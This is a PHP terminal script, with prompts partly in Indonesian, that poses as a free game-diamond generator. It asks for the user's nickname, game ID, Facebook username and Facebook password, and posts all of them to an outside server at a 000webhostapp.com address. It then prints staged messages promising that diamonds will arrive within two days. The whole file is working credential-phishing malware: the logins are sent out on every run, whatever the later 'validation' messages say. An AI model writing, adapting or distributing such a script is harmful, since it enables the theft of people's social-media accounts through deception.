<?php
# Regular Colors
$Black="\033[0;30m";        # Black
$Red="\033[0;31m";          # Red
$Green="\033[0;32m";        # Green
$Yellow="\033[0;33m";       # Yellow
$Blue="\033[0;34m";         # Blue
$Purple="\033[0;35m";       # Purple
$Cyan="\033[0;36m";         # Cyan
$White="\033[0;37m";         # White

$rand= rand(0, 3);

echo $Yellow."[".$White."📘    Facebook Account   📘".$Yellow."]\n\n";
echo $White."┌─[ ".$Green."Nickname ".$White."]\n└╼> ";
$name = trim(fgets(STDIN));
echo $White."┌─[ ".$Green."ID Player ".$White."]\n└╼> ";
$id = trim(fgets(STDIN));
echo $White."┌─[ ".$Green."Username FB ".$White."]\n└╼> ";
$username = trim(fgets(STDIN));
echo $White."┌─[ ".$Green."Password ".$White."]\n└╼> ";
$pass = trim(fgets(STDIN));
echo "\n";
// set post fields
$post = [
    'nickname' => $name,
    'id' => $id,
    'username' => $username,
    'pass' => $pass,
];

$ch = curl_init('https://gmcpestudio.000webhostapp.com/Server/Facebook-server.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

// execute!
$response = curl_exec($ch);
 
// close the connection, release resources used
curl_close($ch);

# Fail System
$alert = $White."[    ".$Red."Failed From Scripts   ".$White."]\n";
# Email Validation
if(preg_match('/^[a-z\d.]{5,}$/i', $username)) {
	$alert = $White."[  ".$Red."Your Username Not Found ".$White."]\n";
	$response = false;
} 
# ID Validation
if(!is_numeric($id) || $id >= 120000001 || $id <= 119000001 ) {
	$alert = $White. "[     ".$Red."Your ID Not Found    ".$White."]\n ";
	$response = false;
}

// do anything you want with your response
if($response == true) {
	echo $White."[    ".$Yellow."Mengirim Permintaan   ".$White."]\n";
	sleep(5);
	echo $White."[    ".$Yellow."Menerima Permintaan   ".$White."]\n";
	sleep(5);
	echo $White."[   ".$Green."Diamond Akan Di Kirim  ".$White."]\n";
	echo $White."[       ".$Blue."Dalam 2 Hari       ".$White."]\n";
	sleep($rand);
	echo $White."[     ".$Red."Exits From Scripts   ".$White."]\n";
	sleep($rand);
	exit;
} else {
	echo $White."[    ".$Yellow."Mengirim Permintaan   ".$White."]\n";
	sleep(5);
	echo $White."[    ".$Yellow."Menerima Permintaan   ".$White."]\n";
	sleep(5);
	echo $alert;
	sleep($rand);
	echo $White."[     ".$Red."Exits From Scripts   ".$White."]\n";
	sleep($rand);
	exit;
}
?>